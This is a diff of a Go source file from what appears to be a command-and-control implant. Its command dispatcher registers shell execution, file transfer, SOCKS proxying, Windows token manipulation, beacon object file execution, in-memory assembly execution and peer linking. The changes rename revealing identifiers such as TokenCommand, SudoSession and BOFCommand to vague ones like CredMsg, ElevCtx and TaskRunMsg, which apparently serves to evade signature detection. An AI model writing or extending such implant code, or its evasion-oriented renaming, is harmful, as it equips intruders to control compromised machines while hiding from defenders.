@@ -17,7 +17,7 @@ import (
 	"unicode"
 )
 
-// Command queue template indices - must match server's common.go
+// Msg queue template indices - must match server's common.go
 const (
 	idxCqWordWindows = 780 // windows
 	idxCqShellCmd    = 781 // cmd
@@ -33,28 +33,28 @@ func getCqStr(idx int) string {
 	return commsTpl(idx)
 }
 
-// CommandQueue manages the processing of commands
-type CommandQueue struct {
+// WorkQueue manages the processing of commands
+type WorkQueue struct {
 	mu              sync.Mutex
-	commands        []Command
-	cmdHandlers     map[int]CommandHandler          // New: numeric ID dispatch
-	cmdRegistry     map[string]CommandInterface     // Deprecated: kept for compatibility
-	cmdContext      *CommandContext
-	activeDownloads map[string]*DownloadInfo
-	activeJobs      map[string]JobInfo
-	activeUploads   map[string]*UploadInfo
+	commands        []Msg
+	cmdHandlers     map[int]OpHandler          // New: numeric ID dispatch
+	cmdRegistry     map[string]OpIface     // Deprecated: kept for compatibility
+	cmdContext      *OpCtx
+	activeDownloads map[string]*FI
+	activeJobs      map[string]WI
+	activeUploads   map[string]*SI
 }
 
 // NewCommandQueue creates a new command queue instance
-func NewCommandQueue() *CommandQueue {
+func NewCommandQueue() *WorkQueue {
 	currentDir, err := os.Getwd()
 	if err != nil {
 		currentDir = "."
 	}
 
-	ctx := &CommandContext{
+	ctx := &OpCtx{
 		WorkingDir:  currentDir,
-		SudoSession: nil,                     // Initialize SudoSession as nil
+		ElevCtx: nil,                     // Initialize ElevCtx as nil
 		SessionEnv:  make(map[string]string), // Initialize session environment map
 		TokenStore:  nil,                     // Will be initialized for Windows
 	}
@@ -65,56 +65,56 @@ func NewCommandQueue() *CommandQueue {
 		ctx.TokenStore = initializeWindowsTokenStore()
 	}
 
-	queue := &CommandQueue{
-		commands:        make([]Command, 0, 10),               // Pre-allocate for typical queue depth
-		cmdHandlers:     make(map[int]CommandHandler, 40),     // Numeric ID handlers
-		cmdRegistry:     make(map[string]CommandInterface, 40), // Deprecated: kept for compatibility
+	queue := &WorkQueue{
+		commands:        make([]Msg, 0, 10),               // Pre-allocate for typical queue depth
+		cmdHandlers:     make(map[int]OpHandler, 40),     // Numeric ID handlers
+		cmdRegistry:     make(map[string]OpIface, 40), // Deprecated: kept for compatibility
 		cmdContext:      ctx,
-		activeDownloads: make(map[string]*DownloadInfo, 4),    // Pre-allocate for concurrent downloads
-		activeJobs:      make(map[string]JobInfo, 8),          // Pre-allocate for concurrent jobs
-		activeUploads:   make(map[string]*UploadInfo, 4),      // Pre-allocate for concurrent uploads
+		activeDownloads: make(map[string]*FI, 4),    // Pre-allocate for concurrent downloads
+		activeJobs:      make(map[string]WI, 8),          // Pre-allocate for concurrent jobs
+		activeUploads:   make(map[string]*SI, 4),      // Pre-allocate for concurrent uploads
 	}
 
 	// Register all core commands using numeric IDs
 	// Cross-platform commands (1-18)
-	queue.RegisterHandler(CmdCd, wrapCommand(&CdCommand{}))
-	queue.RegisterHandler(CmdLs, wrapCommand(&LsCommand{}))
-	queue.RegisterHandler(CmdPwd, wrapCommand(&PwdCommand{}))
-	queue.RegisterHandler(CmdDownload, wrapCommand(&DownloadCommand{}))
-	queue.RegisterHandler(CmdUpload, wrapCommand(&UploadCommand{}))
-	queue.RegisterHandler(CmdShell, wrapCommand(&ShellCommand{}))
-	queue.RegisterHandler(CmdSocks, wrapCommand(&SocksCommand{}))
-	queue.RegisterHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
-	queue.RegisterHandler(CmdJobkill, wrapCommand(&JobKillCommand{}))
-	queue.RegisterHandler(CmdExit, wrapCommand(&ExitCommand{}))
-	queue.RegisterHandler(CmdSleep, wrapCommand(&SleepCommand{}))
-	queue.RegisterHandler(CmdRekey, wrapCommand(&RekeyCommand{}))
-	queue.RegisterHandler(CmdEnv, wrapCommand(&EnvCommand{}))
-	queue.RegisterHandler(CmdCat, wrapCommand(&CatCommand{}))
-	queue.RegisterHandler(CmdHash, wrapCommand(&HashCommand{}))
-	queue.RegisterHandler(CmdHashDir, wrapCommand(&HashDirCommand{}))
-	queue.RegisterHandler(CmdPs, wrapCommand(&PSCommand{}))
-	queue.RegisterHandler(CmdRm, wrapCommand(&RmCommand{}))
-	queue.RegisterHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
+	queue.registerHandler(CmdCd, wrapCommand(&ChDirMsg{}))
+	queue.registerHandler(CmdLs, wrapCommand(&ListDirMsg{}))
+	queue.registerHandler(CmdPwd, wrapCommand(&GetDirMsg{}))
+	queue.registerHandler(CmdDownload, wrapCommand(&FM{}))
+	queue.registerHandler(CmdUpload, wrapCommand(&SendMsg{}))
+	queue.registerHandler(CmdShell, wrapCommand(&ExecMsg{}))
+	queue.registerHandler(CmdSocks, wrapCommand(&ProxyMsg{}))
+	queue.registerHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
+	queue.registerHandler(CmdJobkill, wrapCommand(&WorkStopMsg{}))
+	queue.registerHandler(CmdExit, wrapCommand(&QuitMsg{}))
+	queue.registerHandler(CmdSleep, wrapCommand(&IntervalMsg{}))
+	queue.registerHandler(CmdRekey, wrapCommand(&RotateMsg{}))
+	queue.registerHandler(CmdEnv, wrapCommand(&EnvMsg{}))
+	queue.registerHandler(CmdCat, wrapCommand(&ReadFileMsg{}))
+	queue.registerHandler(CmdHash, wrapCommand(&DigestMsg{}))
+	queue.registerHandler(CmdHashDir, wrapCommand(&DigestDirMsg{}))
+	queue.registerHandler(CmdPs, wrapCommand(&ProcListMsg{}))
+	queue.registerHandler(CmdRm, wrapCommand(&RemoveMsg{}))
+	queue.registerHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
 
 	// Windows specific commands (200-232)
-	queue.RegisterHandler(CmdToken, wrapCommand(&TokenCommand{}))
-	queue.RegisterHandler(CmdRev2self, wrapCommand(&Rev2SelfCommand{}))
-	queue.RegisterHandler(CmdBof, wrapCommand(&BOFCommand{}))
-	queue.RegisterHandler(CmdBofAsync, wrapCommand(&BOFAsyncCommand{}))
-	queue.RegisterHandler(CmdBofJobs, wrapCommand(&BOFJobsCommand{}))
-	queue.RegisterHandler(CmdBofOutput, wrapCommand(&BOFOutputCommand{}))
-	queue.RegisterHandler(CmdBofKill, wrapCommand(&BOFKillCommand{}))
-	queue.RegisterHandler(CmdInlineAssembly, wrapCommand(&InlineAssemblyCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyAsync, wrapCommand(&InlineAssemblyAsyncCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyJobs, wrapCommand(&InlineAssemblyJobsCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyOutput, wrapCommand(&InlineAssemblyOutputCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyKill, wrapCommand(&InlineAssemblyKillCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyJobsClean, wrapCommand(&InlineAssemblyJobsCleanCommand{}))
-	queue.RegisterHandler(CmdInlineAssemblyJobsStats, wrapCommand(&InlineAssemblyJobsStatsCommand{}))
-	queue.RegisterHandler(CmdLink, wrapCommand(&LinkCommand{}))
-	queue.RegisterHandler(CmdUnlink, wrapCommand(&UnlinkCommand{}))
-	queue.RegisterHandler(CmdLinks, wrapCommand(&LinksCommand{}))
+	queue.registerHandler(CmdToken, wrapCommand(&CredMsg{}))
+	queue.registerHandler(CmdRev2self, wrapCommand(&AuthResetMsg{}))
+	queue.registerHandler(CmdBof, wrapCommand(&TaskRunMsg{}))
+	queue.registerHandler(CmdBofAsync, wrapCommand(&AsyncTaskMsg{}))
+	queue.registerHandler(CmdBofJobs, wrapCommand(&JobListMsg{}))
+	queue.registerHandler(CmdBofOutput, wrapCommand(&TaskOutputMsg{}))
+	queue.registerHandler(CmdBofKill, wrapCommand(&JobStopMsg{}))
+	queue.registerHandler(CmdInlineAssembly, wrapCommand(&NativeRunMsg{}))
+	queue.registerHandler(CmdInlineAssemblyAsync, wrapCommand(&NativeAsyncMsg{}))
+	queue.registerHandler(CmdInlineAssemblyJobs, wrapCommand(&NativeJobsMsg{}))
+	queue.registerHandler(CmdInlineAssemblyOutput, wrapCommand(&NativeOutputMsg{}))
+	queue.registerHandler(CmdInlineAssemblyKill, wrapCommand(&NativeStopMsg{}))
+	queue.registerHandler(CmdInlineAssemblyJobsClean, wrapCommand(&NativeCleanMsg{}))
+	queue.registerHandler(CmdInlineAssemblyJobsStats, wrapCommand(&NativeStatsMsg{}))
+	queue.registerHandler(CmdLink, wrapCommand(&RM{}))
+	queue.registerHandler(CmdUnlink, wrapCommand(&DM{}))
+	queue.registerHandler(CmdLinks, wrapCommand(&RLM{}))
 
 	// Print all registered commands
 
@@ -124,20 +124,20 @@ func NewCommandQueue() *CommandQueue {
 	return queue
 }
 
-// RegisterHandler adds a command handler by numeric ID
-func (cq *CommandQueue) RegisterHandler(id int, handler CommandHandler) {
+// registerHandler adds a command handler by numeric ID
+func (cq *WorkQueue) registerHandler(id int, handler OpHandler) {
 	cq.cmdHandlers[id] = handler
 }
 
-// wrapCommand creates a CommandHandler from a CommandInterface (for migration)
-func wrapCommand(cmd CommandInterface) CommandHandler {
-	return func(ctx *CommandContext, args []string) CommandResult {
-		return cmd.Execute(ctx, args)
+// wrapCommand creates a OpHandler from a OpIface (for migration)
+func wrapCommand(cmd OpIface) OpHandler {
+	return func(ctx *OpCtx, args []string) OpResult {
+		return cmd.execute(ctx, args)
 	}
 }
 
 // Helper function to apply session environment before executing any command
-func (cq *CommandQueue) applySessionEnvironment() {
+func (cq *WorkQueue) applySessionEnvironment() {
 	cq.cmdContext.mu.RLock()
 	// Quick check without iteration - most commands have no session env
 	if len(cq.cmdContext.SessionEnv) == 0 {
@@ -153,7 +153,7 @@ func (cq *CommandQueue) applySessionEnvironment() {
 
 // cleanupStaleTransfers periodically removes stale upload/download operations
 // Uses dynamic timeouts based on current sleep/jitter to account for mid-transfer changes
-func (cq *CommandQueue) cleanupStaleTransfers() {
+func (cq *WorkQueue) cleanupStaleTransfers() {
 	ticker := time.NewTicker(5 * time.Minute)
 	defer ticker.Stop()
 
@@ -231,10 +231,10 @@ func calculateTransferTimeout(isDownload bool) time.Duration {
 	return timeout
 }
 
-// AddCommands parses and adds commands to the queue
-func (cq *CommandQueue) AddCommands(jsonData string) error {
+// addCommands parses and adds commands to the queue
+func (cq *WorkQueue) addCommands(jsonData string) error {
 
-	var commands []Command
+	var commands []Msg
 	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
 		return fmt.Errorf(Err(E18))
 	}
@@ -269,14 +269,14 @@ func executeShellCommand(command string) (string, error) {
 }
 
 // executeExternalCommand handles execution of system commands
-func (cq *CommandQueue) executeExternalCommand(cmd Command, cmdType string, args []string) (*CommandResult, error) {
+func (cq *WorkQueue) executeExternalCommand(cmd Msg, cmdType string, args []string) (*OpResult, error) {
 	cmdPath, err := exec.LookPath(cmdType)
 	if err != nil {
-		return &CommandResult{
-			Command:     cmd,
+		return &OpResult{
+			Cmd:     cmd,
 			Error:       fmt.Errorf(ErrCtx(E4, cmdType)),
-			ErrorString: ErrCtx(E4, cmdType),
-			ExitCode:    127,
+			EStr: ErrCtx(E4, cmdType),
+			EC:    127,
 		}, nil
 	}
 
@@ -284,18 +284,18 @@ func (cq *CommandQueue) executeExternalCommand(cmd Command, cmdType string, args
 	execCmd.Dir = cq.cmdContext.WorkingDir
 	output, err := execCmd.CombinedOutput()
 
-	result := &CommandResult{
-		Command: cmd,
+	result := &OpResult{
+		Cmd: cmd,
 		Output:  string(output),
 	}
 
 	if err != nil {
 		result.Error = err
-		result.ErrorString = err.Error()
+		result.EStr = err.Error()
 		if exitErr, ok := err.(*exec.ExitError); ok {
-			result.ExitCode = exitErr.ExitCode()
+			result.EC = exitErr.ExitCode()
 		} else {
-			result.ExitCode = 1
+			result.EC = 1
 		}
 	}
 
